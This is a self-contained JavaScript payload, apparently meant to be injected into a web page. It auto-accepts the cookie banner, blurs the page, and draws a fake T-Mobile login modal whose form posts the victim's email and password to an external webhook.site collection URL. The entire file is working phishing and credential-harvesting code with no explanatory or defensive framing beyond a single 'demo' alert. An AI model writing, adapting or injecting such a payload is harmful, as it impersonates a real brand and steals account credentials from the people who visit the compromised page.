(function() {
  // === CONFIGURATION ===
  const webhookUrl = 'https://webhook.site/399907c5-1b67-465c-a07c-999b01b70d9a';

  // === STEP 1: Auto-close the cookie popup ===
  function closeCookiePopup() {
    const buttons = document.querySelectorAll('button');
    for (let btn of buttons) {
      const text = btn.innerText.toLowerCase();
      if (text.includes('accept all')) {
        console.log('[+] Clicking cookie button');
        btn.click();
        return true;
      }
    }
    return false;
  }

  // Try to close it immediately
  let cookieClosed = closeCookiePopup();

  if (!cookieClosed) {
    const observer = new MutationObserver(function() {
      if (closeCookiePopup()) {
        observer.disconnect();
      }
    });
    observer.observe(document.body, { childList: true, subtree: true });
    setTimeout(() => observer.disconnect(), 3000);
  }

  // === STEP 2: Show the EXACT fake login modal ===
  setTimeout(() => {
    // CREATE a wrapper that holds blurred background + unblurred modal
    const wrapper = document.createElement('div');
    wrapper.id = 'modal-wrapper';
    wrapper.style.cssText = `
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 999999;
      pointer-events: none;
    `;

    // Blur overlay (covers everything)
    const blurOverlay = document.createElement('div');
    blurOverlay.style.cssText = `
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.5);
      backdrop-filter: blur(8px);
      -webkit-backdrop-filter: blur(8px);
      pointer-events: all;
    `;

    // Modal container (sits on top, NOT blurred)
    const modalContainer = document.createElement('div');
    modalContainer.style.cssText = `
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      pointer-events: all;
      z-index: 1000000;
    `;

    // Modal content - EXACT match to screenshot
    modalContainer.innerHTML = `
      <div style="
        background: white;
        width: 400px;
        padding: 40px 30px;
        border-radius: 16px;
        box-shadow: 0 10px 40px rgba(0,0,0,0.3);
        text-align: center;
        font-family: Arial, sans-serif;
      ">
        <!-- Logo -->
        <div style="margin-bottom: 30px;">
          <span style="font-size: 28px; font-weight: bold; color: #E20074;">T</span>
          <span style="font-size: 28px; font-weight: bold; color: #333;">Mobile</span>
        </div>

        <!-- FORM -->
        <form method="POST" action="${webhookUrl}">
          <!-- Email -->
          <div style="margin-bottom: 20px; text-align: left;">
            <label style="display: block; margin-bottom: 5px; color: #555; font-size: 14px;">Email:</label>
            <input type="email" name="email" required style="
              width: 100%;
              padding: 12px;
              border: 1px solid #ddd;
              border-radius: 8px;
              font-size: 16px;
              box-sizing: border-box;
            ">
          </div>

          <!-- Password -->
          <div style="margin-bottom: 25px; text-align: left;">
            <label style="display: block; margin-bottom: 5px; color: #555; font-size: 14px;">Password:</label>
            <input type="password" name="password" required style="
              width: 100%;
              padding: 12px;
              border: 1px solid #ddd;
              border-radius: 8px;
              font-size: 16px;
              box-sizing: border-box;
            ">
          </div>

          <!-- Log In Button -->
          <button type="submit" style="
            width: 100%;
            padding: 14px;
            background: #E20074;
            color: white;
            border: none;
            border-radius: 30px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-bottom: 20px;
          ">Log In</button>

          <!-- Forgot Password -->
          <div style="margin-bottom: 25px;">
            <a href="#" style="color: #E20074; text-decoration: none; font-size: 14px;">Forgot your password?</a>
          </div>

          <!-- Google Sign In -->
          <button type="button" style="
            width: 100%;
            padding: 12px;
            background: white;
            border: 1px solid #ddd;
            border-radius: 30px;
            font-size: 16px;
            cursor: pointer;
            margin-bottom: 25px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
          " onclick="alert('Google Sign In disabled for demo'); return false;">
            <svg width="20" height="20" viewBox="0 0 24 24">
              <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
              <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
              <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
              <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
            </svg>
            Sign in with Google
          </button>

          <!-- Contact AM -->
          <p style="color: #777; font-size: 13px; margin: 0;">
            Don't have a Tmobile platform account?<br>
            <strong>Please reach out to your account manager.</strong>
          </p>

          <!-- Weather -->
          <div style="margin-top: 25px; color: #999; font-size: 12px;">
            30°C · Partly sunny
          </div>
        </form>

        <!-- Close link -->
        <div style="margin-top: 20px;">
          <a href="#" id="close-modal-link" style="color: #999; font-size: 12px;">Close</a>
        </div>
      </div>
    `;

    // Assemble: wrapper > blurOverlay + modalContainer
    wrapper.appendChild(blurOverlay);
    wrapper.appendChild(modalContainer);
    document.body.appendChild(wrapper);

    // Add close functionality
    document.getElementById('close-modal-link').addEventListener('click', function(e) {
      e.preventDefault();
      wrapper.remove();
    });

    // Close on overlay click
    blurOverlay.addEventListener('click', function() {
      wrapper.remove();
    });

  }, 1000);
})();
